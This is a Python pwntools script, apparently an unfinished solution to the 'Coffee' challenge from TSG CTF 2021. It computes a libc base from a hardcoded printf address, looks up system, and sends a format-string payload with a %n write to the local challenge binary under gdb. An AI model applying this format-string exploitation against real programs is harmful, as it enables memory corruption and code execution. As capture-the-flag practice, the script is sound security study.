import struct
from pwn import *

def x86_64_addr(addr):
	return struct.pack("<Q", addr)

def format_creator(num, tp):
	return "|%{}${}|".format(num, tp).encode()

#elf = ELF("./coffee")
libc = ELF("./libc.so.6")
p = process(["/home/user/my_github/My-CTF-Solutions/tsgctf-2021/Coffee/coffee/coffee"], env={"LD_PRELOAD":"/home/user/my_github/My-CTF-Solutions/tsgctf-2021/Coffee/coffee/libc.so.6"})
pid = gdb.attach(p, gdbscript='''
break *main+100
r
p printf
''')

printf_addr = 0x7fffff626cf0
printf_libc = libc.symbols['printf']
libc.address = printf_addr - printf_libc
system_libc = libc.symbols['system']

#print("[+] Coffee printf got" + hex(printf_got))
print("[+] LIBC base address : " + hex(libc.address))
print("[+] LIBC of printf : " + hex(printf_libc))
print("[+] LIBC of system : " + hex(system_libc))

printf_byte = x86_64_addr(printf_libc)
payload = b"%.349041x"+b"A"*(159-8-7-7-8-8)+format_creator(24, 'p')+format_creator(25, 'n')+b"BBBBBBBB"+b"CCCCCCCC"
#print(payload)
p.sendline(payload)
print(p.recvuntil("bye"))

#p.interactive()
